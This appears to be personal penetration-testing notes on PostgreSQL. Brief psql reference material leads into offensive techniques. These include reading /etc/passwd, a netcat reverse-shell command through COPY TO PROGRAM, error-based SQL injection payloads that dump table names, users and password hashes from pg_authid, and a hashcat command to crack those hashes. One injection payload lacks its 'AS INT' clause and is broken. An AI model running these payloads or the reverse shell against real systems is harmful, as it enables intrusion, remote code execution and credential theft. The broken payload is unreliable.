# PostgreSQL

PostgreSQL notes

### Strucutre

```
Database -> Schema -> Table -> Column
```

### Common Schemas

```
public              -> Application tables
pg_catalog          -> System tables
information_schema  -> metadata
```

### Useful functions

```
version()
current_user
current_database()
```

## psql

**Connecting**

```psql -h <ip> -U <username> -d <database>```

**backslash commands**
```
\l          -> list databases
\c db       -> connect to database
\dt         -> list tables
\d table    -> describe table
\q          -> quit
```

default databases:

- postgres

**Code Execution**

Reading files

```SELECT pg_read_file('/etc/passwd', 0, 1000);```

Popping shell

```COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash <ip> <port>'```

*this will run as the postgres user*

expected output:

```COPY 1```

commands will have their output in stdout and will not be outputted in psql, use a combination of COPY and pg_read_file

Example:

```
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';

SELECT pg_read_file('/tmp/out.txt', 0, 1000);
```

## postgresql injection

### UNION-Based
\#TODO

### Error-Based

When only errors are reflected and 1 string can be leaked at a time
core idea: ```AND 1=CAST((SELECT <data>) AS INT)```

this works when ```<data>``` is of type String and when casted into INT, postgres will be forced to throw an error

### Payloads Example

```
' AND 1=CAST((SELECT <target data>) AS INT) -- 
```

Get current database

```
' AND 1=CAST((current_database()) AS INT) -- 
```

 *note: remember the last space after --*
#### Application tables

Get application table names. Increase offset to shift

```
' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0)) -- 
```

Get Columns of a table

```
' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users'LIMIT 1 OFFSET 0) AS INT) --
```

Get Data

```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --
```

#### System tables

```
pg_roles        -> usernames
pg_authid       -> password hashes
pg_database     -> database names
```

Dump users

```
' AND 1=CAST((SELECT rolname FROM pg_roles Limit 1 OFFSET 0) AS INT) -- 
```

Dump password hash

```
' AND 1=CAST((SELECT rolpassword FROM pg_authid WHERE rolname=current_user) AS INT) -- 
```

Get database name

```
' AND 1=CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS INT) -- 
```

#### PostgreSQL Hash

```
Format: md5(password + username)
Stored as: "md5<hash>"

example: md5ae8c67affdb169a42c9631c02fc67ede

to crack:
hashcat -m 10 'ae8c67affdb169a42c9631c02fc67ede:rubben' /usr/share/wordlists/rockyou.txt
```

*rubben is the username*

### Time-Based

\#TODO